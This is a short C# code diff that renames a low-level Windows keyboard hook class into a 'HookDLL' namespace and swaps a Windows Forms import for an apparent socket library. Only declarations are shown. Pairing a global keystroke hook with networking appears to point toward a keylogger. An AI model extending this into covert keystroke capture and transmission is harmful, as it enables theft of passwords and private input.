@@ -8,11 +8,11 @@ using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
-using System.Windows.Forms;
+using SocketDLL;
 
-namespace IP
+namespace HookDLL
 {
-    class LLKeyboardHook
+    public class LLKeyboardHook
     {
         public delegate IntPtr LLKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         private const int WH_KEYBOARD_LL = 13;
